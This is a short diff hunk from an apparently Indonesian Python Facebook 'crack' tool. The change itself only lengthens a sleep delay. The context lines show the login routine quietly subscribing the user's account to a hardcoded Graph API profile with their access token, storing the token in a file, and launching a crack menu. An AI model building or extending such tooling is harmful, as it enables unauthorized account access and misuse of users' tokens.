@@ -49,7 +49,7 @@ def login():
 			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
 			print(f"[☆] \033[1;32mLogin Berhasil")
 			open("save","a").write(to)
-			time.sleep(1.5)
+			time.sleep(2.5)
 			crack(to,nama).menu()
 		except KeyError:
 			print("     \033[1;31mLogin gagal")
